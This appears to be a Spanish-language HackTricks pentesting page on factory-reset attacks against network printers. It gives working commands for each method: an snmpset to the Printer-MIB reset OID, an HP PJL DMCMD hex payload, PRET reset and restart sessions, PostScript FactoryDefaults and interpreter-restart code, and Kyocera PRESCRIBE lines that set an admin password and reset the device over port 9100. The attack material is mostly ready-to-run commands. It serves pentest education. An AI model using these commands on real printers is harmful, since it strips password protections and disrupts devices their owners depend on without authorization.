<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Restablecer** un dispositivo a los valores de f치brica es una funcionalidad cr칤tica de seguridad ya que **sobrescribe mecanismos de protecci칩n** como contrase침as establecidas por el usuario. Esto generalmente se puede hacer presionando una **combinaci칩n especial de teclas** en el **panel de control** de la impresora. Realizar tal restablecimiento en fr칤o solo toma segundos y, por lo tanto, es un escenario realista para atacantes locales o pentesters, que pueden, por ejemplo, colarse en la sala de copiado a la hora del almuerzo. Sin embargo, el **acceso f칤sico** al dispositivo **no siempre es una opci칩n**.

### SNMP

El Printer-MIB define el objeto **prtGeneralReset** (**OID 1.3.6.1.2.1.43.5.1.1.3.1**) que permite a un atacante reiniciar el dispositivo (powerCycleReset(4)), restablecer la configuraci칩n de NVRAM (resetToNVRAM(5)) o restaurar los valores de f치brica (resetToFactoryDefaults(6)) utilizando SNMP. Esta caracter칤stica/ataque es **compatible con una gran variedad de impresoras** y elimina todos los mecanismos de protecci칩n como contrase침as establecidas por el usuario para el servidor web integrado. Aunque los mecanismos de protecci칩n pueden ser eludidos eficientemente, una desventaja pr치ctica de este enfoque es que toda la configuraci칩n de **direcci칩n IP est치tica se perder치**. **Si no hay servicio DHCP** disponible, el atacante **no** podr치 **reconectarse** al dispositivo despu칠s de restablecerlo a los valores de f치brica.

**Restablecer el dispositivo a los valores de f치brica por defecto** se puede lograr utilizando el comando `snmpset` como se muestra a continuaci칩n (necesitas conocer la **cadena de comunidad**, por defecto en la mayor칤a de los casos es `public`):
```bash
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```
### [PML](./#pml)/[PJL](./#pjl)

En muchos escenarios, un atacante no tiene la capacidad de realizar solicitudes SNMP debido a firewalls o cadenas de comunidad SNMP desconocidas. Sin embargo, en **dispositivos HP**, **SNMP** puede transformarse en su **representaci칩n PML** e incorporar la solicitud dentro de un trabajo de impresi칩n leg칤timo. Esto permite que un atacante **reinicie y/o restablezca el dispositivo** a los valores de f치brica dentro de trabajos de impresi칩n ordinarios como se muestra a continuaci칩n:
```bash
@PJL DMCMD ASCIIHEX="040006020501010301040106"
```
Cualquiera puede reproducir este ataque en impresoras HP, reiniciar o restablecer el dispositivo se puede reproducir f치cilmente usando [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PostScript

PostScript ofrece una caracter칤stica similar: El par치metro del sistema **FactoryDefaults**, 'una bandera que, si se **establece en verdadero** **inmediatamente antes** de que la **impresora se apague**, hace que todos los par치metros no vol치tiles vuelvan a sus valores **predeterminados de f치brica** en el pr칩ximo encendido'. Cabe destacar que **PostScript** tambi칠n tiene la capacidad de **reiniciar** su **entorno**, pero requiere una **contrase침a v치lida**. \
Sin embargo, el int칠rprete de PostScript puede entrar en un **bucle infinito**, como se discute en ataques DoS de [procesamiento de documentos](http://hacking-printers.net/wiki/index.php/Document\_processing), lo que obliga al usuario a **reiniciar manualmente** el dispositivo y, por lo tanto, restablecer la contrase침a de PostScript.

Restablecer los par치metros del sistema PostScript a los valores predeterminados de f치brica:
```bash
<< /FactoryDefaults true >> setsystemparams
```
Reiniciar el int칠rprete de PostScript y la memoria virtual:
```bash
true 0 startjob systemdict /quit get exec
```
Cualquiera puede reiniciar o restablecer el int칠rprete PostScript de una impresora, lo cual **puede reproducirse f치cilmente utilizando** [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PRESCRIBE

Para **dispositivos Kyocera**, los lenguajes de descripci칩n de p치gina **PRESCRIBE** pueden usarse para **restablecer el dispositivo** a los valores de f치brica desde trabajos de impresi칩n ordinarios utilizando uno de los comandos mostrados a continuaci칩n:
```bash
!R! KSUS "AUIO", "CUSTOM:Admin Password = 'admin00'";  CMMT "Drop the security level, reset password";
!R! ACNT "REST";                                       CMMT "Reset account code admin password";
!R! EGRE;                                              CMMT "Reset the engine board to factory defaults";
!R! SIOP0,"RESET:0";                                   CMMT "Reset configuration settings";
```
Para reproducir este ataque, abre una conexi칩n de red cruda al puerto 9100/tcp de la impresora y **env칤a los comandos documentados arriba**.

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
